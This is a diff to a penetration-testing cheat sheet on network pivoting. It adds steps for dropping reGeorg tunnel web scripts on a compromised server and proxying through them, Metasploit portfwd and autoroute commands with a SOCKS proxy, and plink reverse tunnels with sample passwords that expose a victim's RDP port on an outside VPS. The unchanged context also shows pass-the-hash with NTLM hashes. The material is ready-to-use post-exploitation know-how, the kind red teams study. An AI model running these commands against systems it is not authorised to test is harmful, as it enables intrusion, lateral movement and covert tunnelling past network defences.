@@ -32,7 +32,6 @@ Cool Tip : Konami SSH Port forwarding
 -D 1090
 ```
 
-
 ### Local Port Forwarding
 
 ```bash
@@ -60,8 +59,38 @@ Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`
 
 [reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
 
+Drop one of the following files on the server:
+
+- tunnel.ashx
+- tunnel.aspx
+- tunnel.js
+- tunnel.jsp
+- tunnel.nosocket.php
+- tunnel.php
+- tunnel.tomcat.5.jsp
+
 ```python
-python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp
+python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080
+
+optional arguments:
+  -h, --help           show this help message and exit
+  -l , --listen-on     The default listening address
+  -p , --listen-port   The default listening port
+  -r , --read-buff     Local read buffer, max data to be sent per POST
+  -u , --url           The url containing the tunnel script
+  -v , --verbose       Verbose output[INFO|DEBUG]
+```
+
+## Metasploit
+
+```c
+portfwd list
+portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
+
+or
+
+run autoroute -s 192.168.57.0/24
+use auxiliary/server/socks4a
 ```
 
 ## Rpivot
@@ -91,6 +120,14 @@ Passing the hash
 python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
 --ntlm-proxy-port 8080 --domain CORP --username jdoe \
 --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
+```
+
+## plink
+
+```powershell
+plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389    --> exposes the RDP port of the machine in the port 3390 of the SSH Server
+plink -l root -pw mypassword 192.168.18.84 -R
+plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
 ```
 
 ## Basic Pivoting Types
@@ -128,8 +165,10 @@ python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [pro
 | remote host 1     | `ncat -l -p 8080 < file                                                    |
 | remote host 2     | `ncat -l -p 9090 > newfile`                                                |
 
-## Thanks to
+## References
 
 * [Network Pivoting Techniques - Bit rot](https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
 * [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
 * [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
+* [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
+* [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)
